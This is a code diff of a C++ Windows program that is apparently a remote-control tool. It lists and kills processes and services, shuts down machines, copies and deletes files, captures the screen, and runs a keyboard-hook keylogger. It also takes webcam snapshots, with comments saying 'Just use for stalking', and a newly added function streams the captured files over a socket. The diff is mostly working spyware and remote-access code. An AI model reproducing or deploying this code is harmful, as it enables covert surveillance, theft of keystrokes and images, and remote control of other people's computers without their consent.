@@ -4,127 +4,149 @@ VideoCapture* cap = nullptr;
 HHOOK hHook = NULL;
 atomic<bool> keepKeyloggerRunning;
 ofstream fo;
-wstringstream inp;
-wstringstream out;
+stringstream inp, out;
+string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
+string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
+string screenCapturePath = filesystem::current_path().string() + "/screen.png";
 
-map<wstring, map<wstring, function<void()>>> setupHandlers() {
-    return map<wstring, map<wstring, function<void()>>>{
+// Return a map of command to corresponding handler
+map<string, map<string, function<void()>>> setupHandlers() {
+    return {
         {
-            L"list", 
-            map<wstring, function<void()>>{
-                { L"app", listProcesses },
-                { L"service", listServices }
+            "list", 
+            {
+                { "app", listProcesses },
+                { "service", listServices }
             }
         },
         {
-            L"start",
-            map<wstring, function<void()>>{
+            "start",
+            {
                 {
-                    L"app", 
+                    "app", 
                     [] {
-                        wstring appName;
+                        string appName;
                         inp >> appName;
-                        startApp((wchar_t*)appName.c_str());
+                        if (appName == "") throw bad_function_call();
+                        startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
                     }
                 },
                 {
-                    L"service",
+                    "service",
                     [] {
-                        wstring serviceName;
+                        string serviceName;
                         inp >> serviceName;
-                        startServiceByName((wchar_t*)serviceName.c_str());
+                        if (serviceName == "") throw bad_function_call();
+                        startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                     }
                 },
                 {
-                    L"camera", startCamera
+                    "camera", startCamera
                 },
                 {
-                    L"keylogger", startKeylogger
+                    "keylogger", startKeylogger
                 }
             }
         },
         {
-            L"stop",
-            map<wstring, function<void()>>{
+            "stop",
+            {
                 {
-                    L"app", 
+                    "app", 
                     [] {
                         unsigned long procID;
                         inp >> procID;
+                        if (procID == 0) throw bad_function_call();
                         stopApp(procID);
                     }
                 },
                 {
-                    L"service",
+                    "service",
                     [] {
-                        wstring serviceName;
+                        string serviceName;
                         inp >> serviceName;
-                        stopServiceByName((wchar_t*)serviceName.c_str());
+                        if (serviceName == "") throw bad_function_call();
+                        stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                     }
                 },
                 {
-                    L"camera", stopCamera
+                    "camera", stopCamera
                 },
                 {
-                    L"keylogger", stopKeylogger
+                    "keylogger", stopKeylogger
                 }
             }
         },
         {
-            L"power",
-            map<wstring, function<void()>>{
-                { L"shutdown", shutdownMachine },
-                { L"restart", restartMachine }
+            "power",
+            {
+                { "shutdown", shutdownMachine },
+                { "restart", restartMachine }
             }
         },
         {
-            L"file",
-            map<wstring, function<void()>>{
+            "file",
+            {
                 {
-                    L"copy",
+                    "copy",
                     [] {
-                        wstring srcPath, desPath;
+                        string srcPath, desPath;
                         inp >> srcPath >> desPath;
-                        copyFile((wchar_t*)srcPath.c_str(), (wchar_t*)desPath.c_str());
+                        if (srcPath == "" || desPath == "") throw bad_function_call();
+                        copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
                     }
                 },
                 {
-                    L"delete",
+                    "delete",
                     [] {
-                        wstring filePath;
+                        string filePath;
                         inp >> filePath;
-                        deleteFile((wchar_t*)filePath.c_str());
+                        if (filePath == "") throw bad_function_call();
+                        deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
                     }
                 }
             }
         },
         {
-            L"capture",
-            map<wstring, function<void()>>{
-                { 
-                    L"screen", 
-                    [] {
-                        wstring outputPath;
-                        inp >> outputPath;
-                        captureScreen(outputPath);
-                    }
-                }
+            "capture", 
+            {
+                { "screen", captureScreen }
             }
         }
     };
 }
 
+string getInstruction() {
+    stringstream ins;
+    ins << "o--------------------- INSTRUCTIONS ---------------------o\n"
+        << "|                                                        |\n"
+        << "|   list    [app|service]                                |\n"
+        << "|   start   [app|service]      [appPath|serviceName]     |\n"
+        << "|   stop    [app|service]      [processID|serviceName]   |\n"
+        << "|   power   [shutdown|restart]                           |\n"
+        << "|   file    [copy|delete]      srcPath [desPath]         |\n"
+        << "|   capture screen                                       |\n"
+        << "|   start   [camera|keylogger]                           |\n"
+        << "|   stop    [camera|keylogger]                           |\n"
+        << "|   exit                                                 |\n"
+        << "|                                                        |\n"
+        << "o--------------------------------------------------------o\n";
+    return ins.str();
+}
+
 void listProcesses() {
-    PROCESSENTRY32 entry;
-    entry.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32W entry;
+    entry.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
     out << "\n Process ID | " << setw(26) << right << "Executable\n";
-    out << wstring(12, '-') << "o" << wstring(40, '-') << endl;
-    if (Process32First(snapshot, &entry)) {
+    out << string(12, '-') << "o" << string(40, '-') << endl;
+    if (Process32FirstW(snapshot, &entry)) {
         do {
-            out << setw(11) << right << entry.th32ProcessID << " | " << entry.szExeFile << endl;
-        } while (Process32Next(snapshot, &entry));
+            wstring executeFileName(entry.szExeFile);
+            out << setw(11) << right << entry.th32ProcessID << " | " 
+                << string(executeFileName.begin(), executeFileName.end()) << endl;
+        } while (Process32NextW(snapshot, &entry));
     }
     else {
         out << "\nFailed to list processes.\n";
@@ -132,10 +154,10 @@ void listProcesses() {
     CloseHandle(snapshot);
 }
 
-void startApp(wchar_t* appPath) {
+void startApp(LPWSTR appPath) {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    if (CreateProcess(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+    if (CreateProcessW(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         out << "\nProcess started successfully.\n";
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -162,47 +184,50 @@ void stopApp(DWORD processID) {
 }
 
 void listServices() {
-    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
+    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
     if (!scmHandle) {
         out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
     
     DWORD bytesNeeded = 0, servicesCount = 0, resumeHandle = 0;
-    EnumServicesStatus(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);
+    EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);
 
     vector<BYTE> buffer(bytesNeeded);
     ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
-    if (!EnumServicesStatus(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
+    if (!EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
         out << "\nEnumServicesStatus failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
         return;
     }
 
     out << "\n" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
-    out << wstring(51, '-') << "o" << wstring(102, '-') << "o" << wstring(10, '-') << endl;
+    out << string(51, '-') << "o" << string(102, '-') << "o" << string(10, '-') << endl;
     for (DWORD i = 0; i < servicesCount; ++i) {
-        out << setw(50) << left << wstring(serviceStatus[i].lpServiceName) << " | " << setw(100) << wstring(serviceStatus[i].lpDisplayName) << " | " << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
+        wstring serviceName(serviceStatus[i].lpServiceName), displayName(serviceStatus[i].lpDisplayName);
+        out << setw(50) << left << string(serviceName.begin(), serviceName.end()) << " | " 
+            << setw(100) << string(displayName.begin(), displayName.end()) << " | " 
+            << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
     }
     
     CloseServiceHandle(scmHandle);
 }
 
 void startServiceByName(LPCWSTR serviceName) {
-    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
+    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
     if (!scmHandle) {
         out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
 
-    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_START);
+    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_START);
     if (!serviceHandle) {
         out << "\nOpenService failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
         return;
     }
 
-    if (!StartService(serviceHandle, 0, nullptr)) {
+    if (!StartServiceW(serviceHandle, 0, nullptr)) {
         out << "\nStartService failed with error: " << GetLastError() << endl;
     }
     else {
@@ -214,13 +239,13 @@ void startServiceByName(LPCWSTR serviceName) {
 }
 
 void stopServiceByName(LPCWSTR serviceName) {
-    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
+    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
     if (!scmHandle) {
         out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
 
-    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_STOP);
+    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_STOP);
     if (!serviceHandle) {
         out << "\nOpenService failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
@@ -243,8 +268,12 @@ void shutdownMachine() {
     if (!enableShutdownPrivilege()) {
         return;
     }
-    if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, FALSE, REASON_OTHER)) {
-        out << "\nShutdown initiated successfully.\n";
+
+    const wchar_t* shutdownMessage = L"System is shutting down for maintenance.";
+    DWORD shutdownReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;
+
+    if (InitiateSystemShutdownExW(NULL, (LPWSTR)shutdownMessage, SHUTDOWN_DELAY, TRUE, FALSE, shutdownReason)) {
+        out << "\nShutdown initiated successfully. This machine will shutdown after " << SHUTDOWN_DELAY << " seconds.\n";
     }
     else {
         out << "\nFailed to initiate shutdown.\n";
@@ -255,8 +284,12 @@ void restartMachine() {
     if (!enableShutdownPrivilege()) {
         return;
     }
-    if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, TRUE, REASON_OTHER)) {
-        out << "\nRestart initiated successfully.\n";
+
+    const wchar_t* restartMessage = L"System is restarting for maintenance.";
+    DWORD restartReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;
+
+    if (InitiateSystemShutdownExW(NULL, (LPWSTR)restartMessage, SHUTDOWN_DELAY, TRUE, TRUE, restartReason)) {
+        out << "\nRestart initiated successfully. This machine will restart after " << SHUTDOWN_DELAY << " seconds.\n";
     }
     else {
         out << "\nFailed to initiate restart.\n";
@@ -264,7 +297,7 @@ void restartMachine() {
 }
 
 void copyFile(LPCWSTR src, LPCWSTR dest) {
-    if (CopyFile(src, dest, FALSE)) {
+    if (CopyFileW(src, dest, FALSE)) {
         out << "\nFile copied successfully.\n";
     }
     else {
@@ -273,7 +306,7 @@ void copyFile(LPCWSTR src, LPCWSTR dest) {
 }
 
 void deleteFile(LPCWSTR filePath) {
-    if (DeleteFile(filePath)) {
+    if (DeleteFileW(filePath)) {
         out << "\nFile deleted successfully.\n";
     }
     else {
@@ -281,7 +314,7 @@ void deleteFile(LPCWSTR filePath) {
     }
 }
 
-void captureScreen(wstring outputPath) {
+void captureScreen() {
     // Get the desktop device context (DC)
     HDC hScreenDC = GetDC(NULL);
     HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
@@ -300,7 +333,7 @@ void captureScreen(wstring outputPath) {
 
     // Convert the HBITMAP to a Mat
     BITMAP bmp;
-    GetObject(hBitmap, sizeof(BITMAP), &bmp);
+    GetObjectW(hBitmap, sizeof(BITMAP), &bmp);
 
     // Prepare the OpenCV Mat structure
     Mat mat(screenHeight, screenWidth, CV_8UC4);  // 4 channels: BGRA format
@@ -321,8 +354,8 @@ void captureScreen(wstring outputPath) {
     // Check if the capture was successful
     if (!bgrMat.empty()) {
         // Save the captured screen to a file
-        if (imwrite(string(outputPath.begin(), outputPath.end()), bgrMat)) {
-            out << "\nScreenshot saved as " << outputPath << endl;
+        if (imwrite(screenCapturePath, bgrMat)) {
+            out << "\nCapture screen successfuly.\n\nSee more in file " << screenCapturePath.substr(screenCapturePath.find_last_of("/") + 1);
         }
         else {
             out << "\nFailed to save the screenshot.\n";
@@ -362,15 +395,15 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void KeyloggerThread() {
     // Set the hook for the keyboard
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
+    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
     
     // Message loop to keep the hook alive
     MSG msg;
     while (keepKeyloggerRunning) {
         // Check for messages with a timeout
-        if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
+        if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
             TranslateMessage(&msg);
-            DispatchMessage(&msg);
+            DispatchMessageW(&msg);
         }
         else {
             // Sleep to avoid busy waiting
@@ -383,8 +416,7 @@ void KeyloggerThread() {
 }
 
 void startKeylogger() {
-    string path = filesystem::current_path().string() + "/keylogger.txt";
-    fo.open(path);
+    fo.open(keyloggerCapturePath);
     keepKeyloggerRunning = true;
     thread keyloggerThread(KeyloggerThread);
     keyloggerThread.detach(); // Detach the thread to run independently
@@ -394,8 +426,8 @@ void startKeylogger() {
 void stopKeylogger() {
     keepKeyloggerRunning = false;
     // Post a message to wake up the message loop
-    PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
-    out << "\nKeylogger stopped successfully.\n";
+    PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
+    out << "\nKeylogger stopped successfully.\n\nSee more in file " << keyloggerCapturePath.substr(keyloggerCapturePath.find_last_of("/") + 1);
     fo.close();
 }
 
@@ -403,13 +435,13 @@ void startCamera() {
     cap = new VideoCapture(0);
     cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
     cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
+    
     Mat frame;
     *cap >> frame;
-    string path = filesystem::current_path().string() + "/webcam.png";
-    imwrite(path, frame); // Just use for stalking =))
+    imwrite(webcamCapturePath, frame); // Just use for stalking =))
 
     if (cap->isOpened()) {
-        out << "\nWebcam opened successfully.\n";
+        out << "\nWebcam opened successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
     }
     else {
         out << "\nFailed to open webcam.\n";
@@ -418,12 +450,32 @@ void startCamera() {
 
 void stopCamera() {
     if (cap && cap->isOpened()) {
+        Mat frame;
+        *cap >> frame;
+        imwrite(webcamCapturePath, frame); // Just use for stalking =))
+        
         cap->release();
         destroyAllWindows();
-        out << "\nWebcam closed successfully.\n";
+        out << "\nWebcam closed successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
     }
     else {
         out << "\nError: Webcam is not open.\n";
+    }
+}
+
+void sendFile(CSocket& socket, const string& filePath) {
+    CFile file;
+    if (file.Open(wstring(filePath.begin(), filePath.end()).c_str(), CFile::modeRead)) {
+        CSocketFile socketFile(&socket);
+        CArchive archive(&socketFile, CArchive::store);
+
+        unsigned char buffer[BUFFER_SIZE];
+        UINT bytesRead;
+        while ((bytesRead = file.Read(buffer, sizeof(buffer)))) {
+            archive.Write(buffer, bytesRead);
+        }
+        archive.Flush();
+        file.Close();
     }
 }
 
@@ -434,14 +486,14 @@ bool enableShutdownPrivilege() {
     // Open a handle to the process's access token
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
         out << "\nFailed to open process token. Error: " << GetLastError() << endl;
-        return false;
+        return 0;
     }
 
     // Look up the LUID for the shutdown privilege
-    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
+    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
         out << "\nFailed to lookup privilege value. Error: " << GetLastError() << endl;
         CloseHandle(token);
-        return false;
+        return 0;
     }
 
     tkp.PrivilegeCount = 1;  // We are enabling one privilege
@@ -451,9 +503,9 @@ bool enableShutdownPrivilege() {
     if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
         out << "\nFailed to adjust token privileges. Error: " << GetLastError() << endl;
         CloseHandle(token);
-        return false;
+        return 0;
     }
 
     CloseHandle(token);
-    return true;
+    return 1;
 }
